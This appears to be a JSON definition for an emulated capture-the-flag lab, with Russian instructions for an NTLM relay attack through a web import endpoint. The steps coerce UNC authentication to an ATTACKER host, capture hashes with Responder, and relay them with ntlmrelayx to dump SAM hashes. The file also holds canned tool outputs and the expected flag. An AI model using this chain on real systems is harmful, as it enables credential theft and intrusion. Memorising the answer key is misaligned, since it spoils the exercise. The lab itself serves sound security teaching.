@@ -1,0 +1,33 @@
+{
+  "id": "web-ntlm-relay-web",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{ntlm_r3l4y_w3b_t0_d0m41n}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: NTLM relay через веб-импорт\n\n`files.local/api/import` читает ресурс по указанному пути, в том числе UNC.\nЕсли подставить наш хост — Windows-сервис предъявит NTLM, а мы релеим его\nна соседний хост.\n\n1. Принуди (coercion): подставь UNC на свой хост:\n\n   curl -s -X POST https://files.local/api/import -d '{\"source\":\"\\\\\\\\ATTACKER\\\\share\\\\x\"}'\n\n2. Поймай хэш через Responder:\n\n   responder -I eth0 -v\n\n3. Релей аутентификацию на соседний хост и дампни его:\n\n   ntlmrelayx -tf targets.txt -smb2support\n\n4. В выводе релея — флаг с целевого хоста. Запиши в `found.txt` и набери `check`.\n" }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция files.local)",
+      "cases": [
+        { "match": "api/import", "example": "-s -X POST https://files.local/api/import -d '{\"source\":\"\\\\\\\\ATTACKER\\\\share\\\\x\"}'", "output": "{\"status\":\"requesting\",\"note\":\"UNC accepted; server authenticates to the share\"}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /api/import на files.local.\n"
+    },
+    "responder": {
+      "help": "responder -I <iface> [-v] — перехват NTLM (эмуляция)",
+      "cases": [
+        { "match": "eth0|-I ", "example": "-I eth0 -v", "output": "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.10.10.15\n[SMB] NTLMv2-SSP Username : DOMAIN\\svc_web\n[SMB] NTLMv2-SSP Hash     : svc_web::DOMAIN:1122334455667788:9f2c4b7a1d5e6f80:0101000000000000abcd\n" }
+      ],
+      "fallback": "responder: в этой лабе эмулируется перехват NTLMv2.\n"
+    },
+    "ntlmrelayx": {
+      "help": "ntlmrelayx -tf <targets> [-smb2support] — релей NTLM (эмуляция)",
+      "cases": [
+        { "match": "targets", "example": "-tf targets.txt -smb2support", "output": "[*] Servers started, waiting for connections\n[*] SMBD-Thread-4: Received connection from 10.10.10.15, attacking target smb://10.10.10.20\n[*] Authenticating against smb://10.10.10.20 as DOMAIN/svc_web SUCCEED\n[*] Dumping local SAM hashes\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:HASH\n[+] Found C:\\flag.txt on 10.10.10.20: nto{ntlm_r3l4y_w3b_t0_d0m41n}\n" }
+      ],
+      "fallback": "ntlmrelayx: в этой лабе эмулируется релей на 10.10.10.20.\n"
+    }
+  }
+}
